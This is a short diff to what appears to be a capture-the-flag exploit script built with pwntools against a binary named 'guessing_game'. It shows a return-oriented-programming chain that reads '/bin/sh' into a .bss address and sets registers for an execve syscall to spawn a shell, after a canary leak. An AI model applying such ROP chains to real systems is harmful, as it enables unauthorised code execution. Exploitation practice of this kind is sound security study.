@@ -30,10 +30,11 @@ log.info(f"canary value: {hex(canary_val)}")
 # 2. ROP to pop a shell
 e = ELF('./guessing_game')
 r = ROP('./guessing_game')
+bss_binsh = 0x404078
 chain = [
-    r.rdi.address, 0x404078,
+    r.rdi.address, bss_binsh,
     e.plt.gets,
-    r.rdi.address, 0x404078,
+    r.rdi.address, bss_binsh,
     r.rsi.address, 0,
     r.rdx.address, 0,
     r.rax.address, 0x3b,
